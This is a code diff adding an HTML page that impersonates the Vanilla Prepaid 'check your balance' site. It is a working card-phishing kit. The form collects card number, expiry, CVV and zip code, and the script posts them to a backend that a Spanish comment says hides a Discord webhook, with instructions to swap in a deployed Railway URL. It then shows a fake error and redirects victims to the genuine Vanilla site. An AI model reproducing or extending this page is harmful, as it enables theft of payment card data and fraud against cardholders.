@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanilla Prepaid</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/footer.css">
+    <style>
+        /* overlay used when error=true parameter is present */
+        .error-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .error-overlay .error-box {
+            background: #fff;
+            color: #e31818;
+            padding: 2rem 3rem;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            max-width: 90%;
+        }
+
+        :root {
+            --rojo-principal: #d32f2f;
+        }
+
+        .card-form {
+            font-family: Arial, sans-serif;
+            color: var(--rojo-principal);
+            padding: 20px;
+        }
+
+        .card-form .container {
+            max-width: 400px;
+        }
+
+        .card-form h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--rojo-principal);
+        }
+
+        .card-form h3 {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .card-form .input-group {
+            margin-bottom: 15px;
+        }
+
+        .card-form input {
+            border: 1px solid var(--rojo-principal);
+            padding: 10px;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* --- GRID CORRECTION TO ALIGN ZIP CODE --- */
+        .card-form .row {
+            display: grid;
+            grid-template-columns: repeat(3, 70px) 30px;
+            /* 3 columns for inputs + 1 for the icon ? */
+            gap: 10px;
+            align-items: center;
+        }
+
+        .card-form .small-input {
+            width: 100%;
+            text-align: center;
+        }
+
+        /* We force the Zip Code to the second row, first column */
+        .zip-container {
+            grid-column: 1 / span 2;
+            /* Occupies the width equivalent to MM and a bit more */
+            grid-row: 2;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .zip-container input {
+            text-align: left;
+        }
+
+        .help-icon {
+            background-color: var(--rojo-principal);
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .label-text {
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .btn-submit {
+            background-color: var(--rojo-principal);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+
+        .show-info {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+        }
+    </style>
+
+    <script>
+        // Lógica de redirección y Discord integrada
+        window.addEventListener('DOMContentLoaded', function () {
+            var params = new URLSearchParams(window.location.search);
+            if (params.get('error') === 'true') {
+                showErrorAndRedirect();
+            }
+
+            var form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    var card = document.querySelector('input[placeholder="Card Number"]').value;
+                    var mm = document.querySelector('input[placeholder="MM"]').value;
+                    var aa = document.querySelector('input[placeholder="AA"]').value;
+                    var cvv = document.querySelector('input[placeholder="CVV"]').value;
+                    var zip = document.querySelector('input[placeholder="zip code"]').value;
+
+                    // Enviar datos al backend de Railway (el webhook está oculto allí)
+                    var formData = {
+                        card: card,
+                        mm: mm,
+                        aa: aa,
+                        cvv: cvv,
+                        zip: zip
+                    };
+                    
+                    // REEMPLAZA ESTA URL CON TU URL DE RAILWAY DESPUÉS DE DESPLEGAR
+                    // Ejemplo: https://tu-proyecto.up.railway.app/api/submit-form
+                    var apiUrl = 'http://localhost:3000/api/submit-form'; // Para desarrollo local
+                    
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formData)
+                    }).finally(function () {
+                        window.location.href = 'error.html';
+                    });
+                });
+            }
+
+            // Restrict numeric inputs to numbers only
+            var numericInputs = document.querySelectorAll('input[placeholder="Card Number"], input[placeholder="MM"], input[placeholder="AA"], input[placeholder="CVV"], input[placeholder="zip code"]');
+            numericInputs.forEach(function (input) {
+                input.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            });
+        });
+
+        function showErrorAndRedirect() {
+            var overlay = document.createElement('div');
+            overlay.className = 'error-overlay';
+            overlay.innerHTML = '<div class="error-box"><h1>Error!</h1><p>Redirecting, please wait...</p></div>';
+            document.body.appendChild(overlay);
+            setTimeout(function () {
+                window.location.href = 'https://www.vanillaprepaid.com/';
+            }, 4000);
+        }
+    </script>
+</head>
+
+<body>
+
+    <nav class="navbar">
+        <div class="logo">
+            <img src="img/logo.png" alt="Vanilla logo" class="logo-img">
+        </div>
+        <div class="nav-links">
+            <a href="#">Where to Buy</a>
+            <a href="#">Help</a>
+        </div>
+    </nav>
+
+    <main class="hero-section">
+        <div class="container">
+            <div class="card-form">
+                <h3>Manage Your Card</h3>
+                <h1>Check Your Balance and Access Your Account</h1>
+
+                <form>
+                    <div class="input-group">
+                        <input type="text" placeholder="Card Number" inputmode="numeric" maxlength="16">
+                    </div>
+
+                    <p class="label-text">Expiration Date</p>
+
+                    <div class="row">
+                        <input type="password" placeholder="MM" class="small-input" maxlength="2" inputmode="numeric">
+                        <input type="password" placeholder="AA" class="small-input" maxlength="2" inputmode="numeric">
+                        <input type="password" placeholder="CVV" class="small-input" maxlength="3" inputmode="numeric">
+                        <span class="help-icon">?</span>
+
+                        <div class="zip-container">
+                            <input type="text" placeholder="zip code" maxlength="5" inputmode="numeric">
+                            <span class="help-icon">?</span>
+                        </div>
+                    </div>
+
+                    <div class="show-info">
+                        <span>👁️</span> Show card information
+                    </div>
+
+                    <button type="submit" class="btn-submit">Continue</button>
+                </form>
+            </div>
+
+            <div class="nueva-imagen">
+                <img src="img/Proyecto nuevo.jpg" alt="Gift Delight">
+            </div>
+        </div>
+    </main>
+    <div>
+        <section class="where-to-buy">
+            <div class="cards-row">
+                <article class="buy-card">
+                    <div class="card-top-line"></div>
+                    <div class="card-icon"><img src="img/icon-map.svg" alt="map icon" /></div>
+                    <h3 class="card-title">Available Nationwide</h3>
+                    <p class="card-text">Vanilla Prepaid Cards are available at over 10,000+ convenient Retailer
+                        locations
+                        nationwide.</p>
+                    <a class="card-link" href="#">Learn More</a>
+                </article>
+
+                <article class="buy-card">
+                    <div class="card-top-line"></div>
+                    <div class="card-icon"><img src="img/icon-card.svg" alt="card icon" /></div>
+                    <h3 class="card-title">Get Exactly What You Want</h3>
+                    <p class="card-text">Use anywhere Visa® or Mastercard® are accepted.</p>
+                    <a class="card-link" href="#">Learn More</a>
+                </article>
+
+                <article class="buy-card">
+                    <div class="card-top-line"></div>
+                    <div class="card-icon"><img src="img/icon-money.svg" alt="money icon" /></div>
+                    <h3 class="card-title">Funds Never Expire</h3>
+                    <p class="card-text">Enjoy at your leisure, Vanilla Prepaid funds never expire.</p>
+                    <a class="card-link" href="#">Learn More</a>
+                </article>
+            </div>
+            <div class="where-footer">
+                <div class="floating-logo"> <img src="img/logo.png" alt="logo" /></div>
+                <div class="where-text">Where To Buy</div>
+            </div>
+        </section>
+
+        <footer class="main-footer">
+            <div class="footer-container">
+
+
+                <hr class="footer-divider">
+
+                <div class="footer-products">
+                    <p>See our other vanilla products</p>
+                    <ul class="product-links">
+                        <li><a href="#">My Vanilla</a></li>
+                        <li><a href="#">Vanilla Reload</a></li>
+                    </ul>
+                    <p class="copyright">Copyright © 2026 InComm. All rights reserved.</p>
+                </div>
+
+                <div class="footer-legal">
+                    <p>
+                        Vanilla Prepaid Mastercard® and OneVanilla Prepaid Mastercard® cards are issued by
+                        Peoples Trust Company with Mastercard International license. ®/TM Mastercard is a registered
+                        trademark,
+                        and the circles design is a registered trademark of Mastercard International Incorporated. The
+                        Vanilla Prepaid Visa* card is issued by Peoples Trust Company with Visa International license.
+                    </p>
+                    <p class="trademark">
+                        *Trademark of Visa International Service Association and used under license by
+                        Peoples Trust Company.
+                    </p>
+                </div>
+
+                <div class="footer-bottom-links">
+                    <a href="#">privacy policy</a>
+                    <a href="#">Terms of Use</a>
+                    <a href="#">Cardholder Agreement</a>
+                    <a href="#">Accessibility Statement</a>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+
+
+
+
+
+</body>
+
+</html>
